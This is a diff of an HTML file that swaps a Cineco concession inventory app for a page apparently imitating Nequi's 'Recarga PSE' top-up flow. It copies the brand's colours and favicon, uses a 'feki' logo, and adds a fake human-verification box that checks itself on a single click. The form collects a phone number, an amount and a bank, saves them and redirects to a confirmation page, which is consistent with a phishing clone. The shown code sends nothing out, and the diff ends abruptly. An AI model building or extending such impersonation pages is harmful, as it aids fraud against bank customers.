@@ -1,308 +1,424 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Inventario Confitería Cineco</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-    <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
-    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.5.25/jspdf.plugin.autotable.min.js"></script>
-    <script>
-        tailwind.config = {
-            darkMode: 'class'
-        }
-    </script>
-    <style>
-        body { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
-        input[type=number]::-webkit-inner-spin-button { -webkit-appearance: none; }
-        
-        @keyframes pulse-blue {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); background-color: #2563eb; }
-            100% { transform: scale(1); }
-        }
-        .animate-pulse-save {
-            animation: pulse-blue 0.3s ease-in-out;
-        }
-    </style>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Recarga PSE Nequi</title>
+  <link rel="icon" type="image/png" href="nequi-favicon-dark.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --font-family: "Manrope", sans-serif;
+      --form-field: #f8f1f5;
+      --uva: #200020;
+      --uva-60: #796679;
+      --orquidea: #da0081;
+      --orquidea-30: #f1bfda;
+      --positive: #11da7a;
+      --negro: #000000;
+      --white: #ffffff;
+    }
+ 
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+ 
+    html, body {
+      min-height: 100%;
+      font-family: var(--font-family);
+      -webkit-font-smoothing: antialiased;
+      background: var(--white);
+      color: var(--negro);
+      line-height: 1.5;
+    }
+ 
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 56px 24px;
+    }
+ 
+    .logo-wrap { margin-bottom: 24px; }
+    .logo-wrap img { width: 104px; height: 32px; display: block; }
+ 
+    h1 {
+      font-weight: 700;
+      font-size: 1.5rem;
+      line-height: 2rem;
+      text-align: center;
+      color: var(--uva);
+      margin-bottom: 1rem;
+    }
+ 
+    .form-wrap {
+      width: 100%;
+      max-width: 327.99px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+ 
+    /* ── Campos de texto ── */
+    .field { position: relative; width: 100%; }
+    .field input {
+      width: 100%;
+      height: 48px;
+      background-color: var(--form-field);
+      border: 0;
+      border-radius: 4px;
+      padding: 20px 16px 6px;
+      color: var(--uva);
+      font-family: var(--font-family);
+      font-size: 1rem;
+      font-weight: 500;
+      outline: none;
+      -webkit-text-fill-color: var(--uva);
+    }
+ 
+    .field input::-webkit-outer-spin-button,
+    .field input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+    .field input[type=number] { -moz-appearance: textfield; }
+ 
+    .field label {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: var(--uva);
+      font-size: 1rem;
+      font-weight: 500;
+      transition: all 0.2s ease;
+      pointer-events: none;
+    }
+ 
+    .field input:focus + label,
+    .field input:not(:placeholder-shown) + label {
+      top: 6px;
+      transform: none;
+      font-size: 0.68rem;
+      font-weight: 700;
+      color: var(--orquidea);
+    }
+ 
+    /* ── Select tipo de persona ── */
+    .select-wrap { position: relative; width: 100%; }
+ 
+    .select-wrap select {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0;
+      cursor: pointer;
+      z-index: 2;
+    }
+ 
+    .select-display {
+      width: 100%;
+      height: 48px;
+      background-color: var(--form-field);
+      border-radius: 4px;
+      padding: 0 40px 0 16px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      gap: 1px;
+      pointer-events: none;
+    }
+ 
+    .select-display .select-lbl {
+      font-size: 0.68rem;
+      font-weight: 700;
+      color: var(--orquidea);
+      line-height: 1.2;
+    }
+ 
+    .select-display .select-val {
+      font-family: var(--font-family);
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--uva);
+      line-height: 1.2;
+    }
+ 
+    /* Flecha del select */
+    .select-wrap::after {
+      content: "";
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 10px;
+      height: 6px;
+      background-color: var(--uva-60);
+      clip-path: polygon(0 0, 100% 0, 50% 100%);
+      pointer-events: none;
+      z-index: 1;
+    }
+ 
+    /* ── Selector de banco ── */
+    .banco-trigger { position: relative; cursor: pointer; width: 100%; }
+ 
+    .banco-box {
+      width: 100%;
+      height: 48px;
+      background-color: var(--form-field);
+      border-radius: 4px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 0 40px 0 16px;
+      gap: 1px;
+    }
+ 
+    .banco-box .banco-placeholder {
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--uva);
+      line-height: 1;
+    }
+ 
+    .banco-box .banco-lbl-mini {
+      display: none;
+      font-size: 0.68rem;
+      font-weight: 700;
+      color: var(--orquidea);
+      line-height: 1.2;
+    }
+    .banco-box .banco-val {
+      display: none;
+      font-size: 1rem;
+      font-weight: 500;
+      color: var(--uva);
+      line-height: 1.2;
+    }
+ 
+    .banco-box.selected .banco-placeholder { display: none; }
+    .banco-box.selected .banco-lbl-mini { display: block; }
+    .banco-box.selected .banco-val { display: block; }
+ 
+    /* Flecha del banco */
+    .banco-trigger::after {
+      content: "";
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 10px;
+      height: 6px;
+      background-color: var(--uva-60);
+      clip-path: polygon(0 0, 100% 0, 50% 100%);
+      pointer-events: none;
+    }
+ 
+    /* ── Mosparo ── */
+    .mosparo-box {
+      background: var(--white);
+      border: 2px solid var(--orquidea-30);
+      border-radius: 11px;
+      display: flex;
+      align-items: center;
+      padding: 20px 24px;
+      gap: 12px;
+      cursor: pointer;
+      position: relative;
+    }
+ 
+    .mosparo-circle {
+      width: 40px;
+      height: 40px;
+      border: 3px solid var(--orquidea);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex: 0 0 40px;
+      position: relative;
+      transition: 0.25s;
+    }
+ 
+    .mosparo-circle::before {
+      content: "";
+      display: block;
+      position: absolute;
+      inset: -3px;
+      width: 40px;
+      height: 40px;
+      border: 1px solid var(--orquidea);
+      border-radius: 20px;
+      opacity: 0;
+      transform: scale(1);
+      transform-origin: center center;
+      animation: mosparo__ping-animation 3s infinite;
+    }
+ 
+    @keyframes mosparo__ping-animation {
+      0% { transform: scale(1); opacity: 0; }
+      50% { opacity: 0.5; }
+      100% { transform: scale(1.8); opacity: 0; }
+    }
+ 
+    .mosparo-box.loading .mosparo-circle::before,
+    .mosparo-box.checked .mosparo-circle::before { display: none; }
+ 
+    .mosparo-box.loading .mosparo-circle {
+      border-top-color: transparent;
+      animation: spin 0.8s linear infinite;
+    }
+ 
+    @keyframes spin { to { transform: rotate(360deg); } }
+ 
+    .checkmark {
+      display: none;
+      width: 14px; height: 8px;
+      border-left: 3px solid var(--positive);
+      border-bottom: 3px solid var(--positive);
+      transform: rotate(-45deg);
+      margin-top: -3px;
+    }
+ 
+    .mosparo-box.checked { border-color: var(--positive); }
+    .mosparo-box.checked .mosparo-circle { border-color: var(--positive); }
+    .mosparo-box.checked .checkmark { display: block; }
+ 
+    .mosparo-lbl { color: var(--uva); font-weight: 400; font-size: 16px; line-height: 22px; }
+ 
+    /* ── Botón ── */
+    .disclaimer { font-size: 0.8rem; color: var(--uva-60); text-align: center; margin: 10px 0; }
+    .btn-continuar {
+      height: 48px; background: var(--orquidea-30); color: #fff; border: none; border-radius: 8px;
+      font-size: 1rem; font-weight: 700; cursor: not-allowed; transition: background 0.3s;
+      width: 100%;
+      font-family: var(--font-family);
+    }
+    .btn-continuar.active { background: var(--orquidea); cursor: pointer; }
+ 
+    /* ── Modal bancos ── */
+    .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); z-index: 999; align-items: flex-end; justify-content: center; }
+    .modal-overlay.open { display: flex; }
+    .modal-sheet { background: #fff; border-radius: 24px 24px 0 0; width: 100%; max-width: 500px; padding: 24px 20px; }
+    .bank-list { overflow-y: auto; list-style: none; max-height: 40vh; }
+    .bank-list li { padding: 14px 0; border-bottom: 1px solid #F4F0F4; cursor: pointer; font-weight: 600; color: var(--uva); }
+  </style>
 </head>
-<body class="bg-gray-50 text-slate-900 dark:bg-slate-950 dark:text-slate-100 transition-colors duration-300">
-    <div id="root"></div>
-
-    <script type="text/babel">
-        const { useState, useEffect } = React;
-
-        const ITEMS = [
-            { code: '37000', desc: 'ACEITE PARA CRISPETAS', unit: 'LITRO' },
-            { code: '37160', desc: 'BABY JOHNNY 48', unit: 'UNIDAD' },
-            { code: '30616', desc: 'BAG IN BOX JUGO HIT MANGO 12 LT', unit: 'UNIDAD' },
-            { code: '30615', desc: 'BAG IN BOX JUGO HIT MORA 12 LT', unit: 'UNIDAD' },
-            { code: '30623', desc: 'BAG IN BOX KOLA ROMAN ZERO 5 LT', unit: 'UNIDAD' },
-            { code: '35031', desc: 'BAG IN BOX 5L', unit: 'UNIDAD' },
-            { code: '34022', desc: 'BALDE 130 OZ', unit: 'UNIDAD' },
-            { code: '34021', desc: 'BALDE 170 OZ', unit: 'UNIDAD' },
-            { code: '34473', desc: 'BALDE 85 OZ', unit: 'UNIDAD' },
-            { code: '31455', desc: 'BIB BRISA MANZANA 5LT', unit: 'UNIDAD' },
-            { code: '35030', desc: 'BIB COCA COLA 17L', unit: 'UNIDAD' },
-            { code: '35150', desc: 'BIB POSTOBON 10L', unit: 'UNIDAD' },
-            { code: '35141', desc: 'BIB POSTOBON 18L', unit: 'UNIDAD' },
-            { code: '34515', desc: 'BIB TE FUZE', unit: 'UNIDAD' },
-            { code: '37608', desc: 'BOLSA DE QUESO CHEDDAR', unit: 'UNIDAD' },
-            { code: '30331', desc: 'BOLSA KRAFT MEDIANA', unit: 'UNIDAD' },
-            { code: '34060', desc: 'BOLSA SANDWICH', unit: 'UNIDAD' },
-            { code: '34438', desc: 'CAJA CINE COMBITO', unit: 'UNIDAD' },
-            { code: '34070', desc: 'CAJA PORTA PERRO', unit: 'UNIDAD' },
-            { code: '37811', desc: 'CARAMELO', unit: 'UNIDAD' },
-            { code: '37169', desc: 'CHOCOLATINA JET 25G', unit: 'UNIDAD' },
-            { code: '35010', desc: 'CONFIT AGUA MANANTIAL PET 600 ML', unit: 'UNIDAD' },
-            { code: '3590', desc: 'CONFITERIA BRISA LIMA LIMON PET 600 ML', unit: 'UNIDAD' },
-            { code: '30589', desc: 'CONFITERIA BRISA MANZANA PET 600 ML', unit: 'UNIDAD' },
-            { code: '31441', desc: 'CONFITERIA PITILLO PLA 7.2X26', unit: 'UNIDAD' },
-            { code: '34252', desc: 'CONFITERIA TAPA VASO 22 OZ', unit: 'UNIDAD' },
-            { code: '34253', desc: 'CONFITERIA TAPA VASO 32 OZ', unit: 'UNIDAD' },
-            { code: '34254', desc: 'CONFITERIA TAPA VASO 44 OZ', unit: 'UNIDAD' },
-            { code: '34291', desc: 'CONFITERIA VASO GASEOSA GRANDE 44 OZ', unit: 'UNIDAD' },
-            { code: '34293', desc: 'CONFITERIA VASO GASEOSA PEQUEÑO 22 OZ', unit: 'UNIDAD' },
-            { code: '34292', desc: 'CONFITERIA VASO GASEOSA MEDIANO 32 OZ', unit: 'UNIDAD' },
-            { code: '30996', desc: 'CONTENEDORES 6 OZ CONFITERIA', unit: 'UNIDAD' },
-            { code: '37202', desc: 'FLAVACOL', unit: 'UNIDAD' },
-            { code: '30986', desc: 'GALLETA OREO TRITURADO', unit: 'KG' },
-            { code: '30957', desc: 'GALLETA RAMO 60G', unit: 'UNIDAD' },
-            { code: '37648', desc: 'GALON MAYONESA', unit: 'GL' },
-            { code: '37642', desc: 'GALON MOSTAZA', unit: 'GL' },
-            { code: '37643', desc: 'GALON TOMATE', unit: 'GL' },
-            { code: '30597', desc: 'GOMAS GUSANOS ACIDOS 100G', unit: 'UNIDAD' },
-            { code: '30598', desc: 'GOMAS TRULULU SABORES 100G', unit: 'UNIDAD' },
-            { code: '32348', desc: 'HIELOS COCA COLA', unit: 'UNIDAD' },
-            { code: '37400', desc: 'MAIZ PIRA', unit: 'KG' },
-            { code: '37491', desc: 'PAN PERRO', unit: 'UNIDAD' },
-            { code: '37492', desc: 'PAN SANDWICH', unit: 'UNIDAD' },
-            { code: '30455', desc: 'PAPA RIPIO KRUMERCHIPS CONFITERIA', unit: 'UNIDAD' },
-            { code: '30648', desc: 'PAQUETE GALLETAS OREO 54G', unit: 'UNIDAD' },
-            { code: '37454', desc: 'PAQUETE NACHOS 60G', unit: 'UNIDAD' },
-            { code: '37630', desc: 'SAL', unit: 'KG' },
-            { code: '37646', desc: 'SALCHICHA CINECO', unit: 'UNIDAD' },
-            { code: '37641', desc: 'SALSA DE PIÑA', unit: 'UNIDAD' },
-            { code: '34402', desc: 'SALSERA QUESO NACHOS CONFITERIA', unit: 'UNIDAD' },
-            { code: '34477', desc: 'SEPARADOR BALDE 120', unit: 'UNIDAD' },
-            { code: '34476', desc: 'SEPARADOR BALDE 150', unit: 'UNIDAD' },
-            { code: '34478', desc: 'SEPARADOR BALDE 85 OZ', unit: 'UNIDAD' },
-            { code: '34240', desc: 'SERVILLETA SCOTT CAFETERIA BLANCA KIMBERLY', unit: 'UNIDAD' },
-            { code: '30333', desc: 'STICKER DE SEGURIDAD', unit: 'UNIDAD' },
-            { code: '34336', desc: 'STICKERS BOL SANDWICH', unit: 'UNIDAD' },
-            { code: '37320', desc: 'TAJADA JAMON PIETRAN', unit: 'UNIDAD' },
-            { code: '38709', desc: 'TAJADA QUESO MOZARELLA', unit: 'UNIDAD' },
-            { code: '37614', desc: 'TAJADA QUESO SABANA', unit: 'UNIDAD' },
-            { code: '30327', desc: 'TAPA CRISPETA MEDIANA 130 OZ', unit: 'UNIDAD' },
-            { code: '30387', desc: 'TAPA SALSERA 4 ONZAS', unit: 'UNIDAD' },
-            { code: '30649', desc: 'VASO GASEOSA MUFASA', unit: 'UNIDAD' },
-            { code: '34051', desc: 'BOLSA PLASTICA', unit: 'UNIDAD' },
-            { code: '30460', desc: 'CAJA CRISPETA PLATINO', unit: 'UNIDAD' },
-            { code: '34110', desc: 'GUANTES DESECHABLES', unit: 'UNIDAD' }
-        ];
-
-        function App() {
-            const [inventory, setInventory] = useState([]);
-            const [inputs, setInputs] = useState({});
-            const [search, setSearch] = useState("");
-            const [showShareOptions, setShowShareOptions] = useState(false);
-            const [animatingCode, setAnimatingCode] = useState(null);
-            const [darkMode, setDarkMode] = useState(false);
-
-            useEffect(() => {
-                const savedInv = localStorage.getItem('inv_cine_v6_final');
-                if (savedInv) setInventory(JSON.parse(savedInv));
-                else setInventory(ITEMS.map(i => ({ ...i, qty: 0 })));
-
-                const savedTheme = localStorage.getItem('theme');
-                if (savedTheme === 'dark' || (!savedTheme && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
-                    setDarkMode(true);
-                    document.documentElement.classList.add('dark');
-                }
-            }, []);
-
-            useEffect(() => {
-                if (inventory.length > 0) localStorage.setItem('inv_cine_v6_final', JSON.stringify(inventory));
-            }, [inventory]);
-
-            const toggleDarkMode = () => {
-                if (darkMode) {
-                    document.documentElement.classList.remove('dark');
-                    localStorage.setItem('theme', 'light');
-                    setDarkMode(false);
-                } else {
-                    document.documentElement.classList.add('dark');
-                    localStorage.setItem('theme', 'dark');
-                    setDarkMode(true);
-                }
-            };
-
-            const vibrate = () => {
-                if (window.navigator && window.navigator.vibrate) window.navigator.vibrate(50);
-            };
-
-            const triggerFeedback = (code) => {
-                vibrate();
-                setAnimatingCode(code);
-                setTimeout(() => setAnimatingCode(null), 300);
-            };
-
-            const handleAdd = (code) => {
-                const val = parseFloat(inputs[code] || 0);
-                if (val <= 0) return;
-                triggerFeedback(code);
-                setInventory(prev => prev.map(item => 
-                    item.code === code ? { ...item, qty: parseFloat((item.qty + val).toFixed(2)) } : item
-                ));
-                setInputs(prev => ({ ...prev, [code]: '' }));
-            };
-
-            const handleOverwrite = (code) => {
-                const rawValue = inputs[code];
-                if (rawValue === undefined || rawValue === '') return;
-                const val = parseFloat(rawValue);
-                if (confirm(`¿Actualizar total a ${val}?`)) {
-                    triggerFeedback(code);
-                    setInventory(prev => prev.map(item => 
-                        item.code === code ? { ...item, qty: val } : item
-                    ));
-                    setInputs(prev => ({ ...prev, [code]: '' }));
-                }
-            };
-
-            const sendWhatsApp = (type) => {
-                vibrate();
-                const now = new Date();
-                const dateStr = now.toLocaleDateString();
-                const timeStr = now.toLocaleTimeString();
-
-                let title = type === 'conteo' ? '*CONTEO DE INVENTARIO COMPLETO*' : '*CORRECCIÓN DE INVENTARIO*';
-                let itemsToReport = type === 'conteo' ? inventory : inventory.filter(i => i.qty > 0);
-                if (itemsToReport.length === 0) return alert("No hay artículos para reportar.");
-                
-                let text = `${title}\n_Fecha: ${dateStr}_\n_Hora: ${timeStr}_\n\n`;
-                itemsToReport.forEach(i => { text += `*${i.code}* - ${i.desc}: *${i.qty}* ${i.unit}\n`; });
-                window.open(`https://wa.me/?text=${encodeURIComponent(text)}`, '_blank');
-                setShowShareOptions(false);
-            };
-
-            const resetData = () => {
-                if (confirm("¿Borrar todos los conteos acumulados?")) {
-                    vibrate();
-                    setInventory(ITEMS.map(i => ({ ...i, qty: 0 })));
-                }
-            };
-
-            const downloadPDF = () => {
-                vibrate();
-                const { jsPDF } = window.jspdf;
-                const doc = new jsPDF();
-                const now = new Date();
-                const dateStr = now.toLocaleDateString();
-                const timeStr = now.toLocaleTimeString();
-
-                doc.setFontSize(16);
-                doc.text("INVENTARIO GENERAL DE TURNO", 14, 15);
-                doc.setFontSize(10);
-                doc.text(`Fecha: ${dateStr} - Hora: ${timeStr}`, 14, 22);
-                
-                doc.autoTable({ 
-                    head: [['CÓDIGO', 'DESCRIPCIÓN DEL ARTÍCULO', 'CANT', 'UND']], 
-                    body: inventory.map(i => [i.code, i.desc, i.qty, i.unit]), 
-                    startY: 28,
-                    theme: 'grid',
-                    styles: { fontSize: 7 },
-                    headStyles: { fillColor: [15, 23, 42] }
-                });
-                doc.save(`Inventario_Cineco_${dateStr}.pdf`);
-            };
-
-            const filtered = inventory.filter(i => i.desc.toLowerCase().includes(search.toLowerCase()) || i.code.includes(search));
-
-            return (
-                <div className="max-w-xl mx-auto min-h-screen pb-24 flex flex-col relative transition-colors duration-300">
-                    <button onClick={toggleDarkMode} className="fixed bottom-6 right-6 z-[60] bg-slate-800 dark:bg-white text-white dark:text-slate-900 p-4 rounded-full shadow-2xl active:scale-90 transition-all border-2 border-slate-700 dark:border-slate-200">
-                        {darkMode ? (
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
-                        ) : (
-                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>
-                        )}
-                    </button>
-
-                    {showShareOptions && (
-                        <div className="fixed inset-0 z-[100] flex items-center justify-center p-6">
-                            <div className="absolute inset-0 bg-slate-900/60 backdrop-blur-sm" onClick={() => setShowShareOptions(false)}></div>
-                            <div className="bg-white dark:bg-slate-900 w-full max-w-xs rounded-[2.5rem] p-6 relative shadow-2xl">
-                                <h3 className="text-center font-black text-slate-800 dark:text-slate-100 mb-6 uppercase tracking-tight">¿Qué deseas enviar?</h3>
-                                <div className="space-y-3">
-                                    <button onClick={() => sendWhatsApp('correccion')} className="w-full py-4 bg-slate-900 dark:bg-slate-700 text-white rounded-2xl font-bold active:scale-95 transition-all uppercase">Corrección</button>
-                                    <button onClick={() => sendWhatsApp('conteo')} className="w-full py-4 bg-blue-600 text-white rounded-2xl font-bold active:scale-95 transition-all uppercase">Enviar Todo</button>
-                                    <button onClick={() => setShowShareOptions(false)} className="w-full py-2 text-slate-400 font-bold text-sm">Cancelar</button>
-                                </div>
-                            </div>
-                        </div>
-                    )}
-
-                    <header className="bg-slate-900 dark:bg-black text-white p-5 sticky top-0 z-50 shadow-2xl flex justify-between items-center transition-colors">
-                        <div className="border-l-4 border-blue-500 pl-3">
-                            <h1 className="font-black text-xl leading-none tracking-tighter uppercase">Cineco</h1>
-                            <p className="text-[9px] text-blue-400 font-bold uppercase mt-1">Reporte de Confitería</p>
-                            <p className="text-[9px] text-blue-400 font-bold uppercase mt-1">CineColombia contratame de programador</p>
-                        </div>
-                        <div className="flex gap-2">
-                            <button onClick={() => setShowShareOptions(true)} className="bg-slate-700 dark:bg-slate-800 p-3 rounded-2xl active:scale-90 transition-transform">
-                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"/></svg>
-                            </button>
-                            <button onClick={downloadPDF} className="bg-blue-600 p-3 rounded-2xl active:scale-90 transition-transform">
-                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-                            </button>
-                            <button onClick={resetData} className="bg-red-600 p-3 rounded-2xl active:scale-90 transition-transform">
-                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round"><path d="M3 12a9 9 0 1 0 9-9 9.75 9.75 0 0 0-6.74 2.74L3 8"/><path d="M3 3v5h5"/></svg>
-                            </button>
-                        </div>
-                    </header>
-
-                    <div className="p-4 flex-1">
-                        <div className="relative mb-8">
-                            <input className="w-full p-5 pl-14 rounded-3xl shadow-md border-none bg-white dark:bg-slate-900 text-slate-800 dark:text-slate-100 outline-none focus:ring-4 focus:ring-blue-500/20 transition-all font-bold" placeholder="Buscar producto..." value={search} onChange={(e) => setSearch(e.target.value)} />
-                            <svg className="absolute left-5 top-6 text-slate-400" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3" strokeLinecap="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
-                        </div>
-
-                        <div className="space-y-4">
-                            {filtered.map(item => (
-                                <div key={item.code} className="bg-white dark:bg-slate-900 p-6 rounded-[2.5rem] shadow-sm border border-slate-100 dark:border-slate-800 transition-colors">
-                                    <div className="flex justify-between items-start mb-6">
-                                        <div className="flex-1 pr-2">
-                                            <p className="text-[10px] font-black text-blue-600 dark:text-blue-400 uppercase tracking-widest mb-1">{item.code}</p>
-                                            <h2 className="font-extrabold text-slate-800 dark:text-slate-100 leading-tight text-lg">{item.desc}</h2>
-                                        </div>
-                                        <div className={`bg-slate-900 dark:bg-slate-950 px-6 py-3 rounded-3xl text-center min-w-[90px] shadow-xl border-b-4 border-blue-600 transition-all duration-300 ${animatingCode === item.code ? 'animate-pulse-save' : ''}`}>
-                                            <p className="text-[8px] font-bold text-blue-400 uppercase tracking-widest">Stock</p>
-                                            <p className="text-2xl font-black text-white leading-none">{item.qty}</p>
-                                        </div>
-                                    </div>
-                                    <div className="flex gap-3">
-                                        <input type="number" inputMode="decimal" className="w-full bg-slate-50 dark:bg-slate-800 border-2 border-slate-50 dark:border-slate-800 rounded-[1.5rem] px-5 py-4 text-xl font-black text-slate-800 dark:text-slate-100 focus:bg-white dark:focus:bg-slate-700 focus:border-blue-400 outline-none transition-all" placeholder="0" value={inputs[item.code] || ''} onChange={(e) => setInputs({...inputs, [item.code]: e.target.value})} />
-                                        <button onClick={() => handleAdd(item.code)} className="bg-blue-600 text-white px-6 rounded-2xl active:scale-95 transition-all flex items-center shadow-lg shadow-blue-200 dark:shadow-none">
-                                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="4" strokeLinecap="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
-                                        </button>
-                                        <button onClick={() => handleOverwrite(item.code)} className="bg-slate-200 dark:bg-slate-700 text-slate-900 dark:text-slate-100 px-6 rounded-2xl active:scale-95 transition-all flex items-center">
-                                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="4" strokeLinecap="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
-                                        </button>
-                                    </div>
-                                </div>
-                            ))}
-                        </div>
-                    </div>
-                </div>
-            );
-        }
-
-        const root = ReactDOM.createRoot(document.getElementById('root'));
-        root.render(<App />);
-    </script>
+<body>
+ 
+  <div class="logo-wrap"><img src="feki-logo.svg" alt="Logo"></div>
+  <h1>Recarga tu Nequi</h1>
+ 
+  <div class="form-wrap">
+    <div class="field">
+      <input type="tel" id="cel1" placeholder=" " maxlength="10" oninput="update()">
+      <label>Número de celular</label>
+    </div>
+    <div class="field">
+      <input type="tel" id="cel2" placeholder=" " maxlength="10" oninput="update()">
+      <label>Confirma el número de celular</label>
+    </div>
+    <div class="field">
+      <input type="text" id="monto" placeholder=" " oninput="formatMonto(this)">
+      <label>¿Cuánto?</label>
+    </div>
+ 
+    <!-- Select tipo de persona -->
+    <div class="select-wrap">
+      <div class="select-display">
+        <span class="select-lbl">Tipo de persona</span>
+        <span class="select-val" id="tipoDisplay">Natural</span>
+      </div>
+      <select id="tipo" onchange="actualizarTipo(this)">
+        <option value="natural">Natural</option>
+        <option value="juridica">Jurídica</option>
+      </select>
+    </div>
+ 
+    <!-- Selector de banco -->
+    <div class="banco-trigger" onclick="abrirModal()">
+      <div class="banco-box" id="bancoBox">
+        <span class="banco-placeholder">Elige el banco</span>
+        <span class="banco-lbl-mini">Elige el banco</span>
+        <span class="banco-val" id="bancoVal"></span>
+      </div>
+    </div>
+ 
+    <div class="mosparo-box" id="mosparoBox" onclick="activarMosparo()">
+      <div class="mosparo-circle" id="mosparoCircle"><div class="checkmark"></div></div>
+      <div class="mosparo-lbl">Confirmo que soy una persona real.</div>
+    </div>
+ 
+    <p class="disclaimer">La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.</p>
+    <button class="btn-continuar" id="btnContinuar">Continuar</button>
+  </div>
+ 
+  <div class="modal-overlay" id="modalOverlay">
+    <div class="modal-sheet">
+      <div class="bank-list" id="bankList"></div>
+      <button onclick="cerrarModal()" style="width:100%; border:none; background:none; color:var(--orquidea); font-weight:700; padding:15px; font-family:var(--font-family); font-size:1rem;">Cerrar</button>
+    </div>
+  </div>
+ 
+<script>
+  const bancos = ["Bancolombia", "Davivienda", "Banco de Bogotá", "BBVA", "Nequi", "Daviplata", "Banco Falabella"];
+  let bancoSel = '', verificado = false;
+ 
+  function actualizarTipo(sel) {
+    document.getElementById('tipoDisplay').textContent = sel.options[sel.selectedIndex].text;
+  }
+ 
+  function formatMonto(input) {
+    let v = input.value.replace(/\D/g, "");
+    input.value = v ? "$" + new Intl.NumberFormat('es-CO').format(v) : "";
+    update();
+  }
+ 
+  function activarMosparo() {
+    if (verificado) return;
+    document.getElementById('mosparoBox').classList.add('checked');
+    verificado = true;
+    update();
+  }
+ 
+  function renderBancos() {
+    const ul = document.getElementById('bankList');
+    ul.innerHTML = '';
+    bancos.forEach(b => {
+      const li = document.createElement('li');
+      li.textContent = b;
+      li.onclick = () => {
+        bancoSel = b;
+        const box = document.getElementById('bancoBox');
+        box.classList.add('selected');
+        document.getElementById('bancoVal').textContent = b;
+        cerrarModal();
+        update();
+      };
+      ul.appendChild(li);
+    });
+  }
+ 
+  function abrirModal() { document.getElementById('modalOverlay').classList.add('open'); renderBancos(); }
+  function cerrarModal() { document.getElementById('modalOverlay').classList.remove('open'); }
+ 
+  function update() {
+    const c1 = document.getElementById('cel1').value;
+    const c2 = document.getElementById('cel2').value;
+    const m = document.getElementById('monto').value.replace(/\D/g, "");
+    const ok = c1.length === 10 && c1 === c2 && parseInt(m) >= 1000 && bancoSel && verificado;
+ 
+    const btn = document.getElementById('btnContinuar');
+    btn.classList.toggle('active', ok);
+    btn.onclick = ok ? guardarYEnviar : null;
+  }
+ 
+  function guardarYEnviar() {
+    const data = {
+      phoneNumber: document.getElementById('cel1').value,
+      transactionValue: document.getElementById('monto').value,
+      bankText: bancoSel.trim()
+    };
+    localStorage.setItem('formData', JSON.stringify(data));
+    window.location.href = "confirmacion.html";
+  }
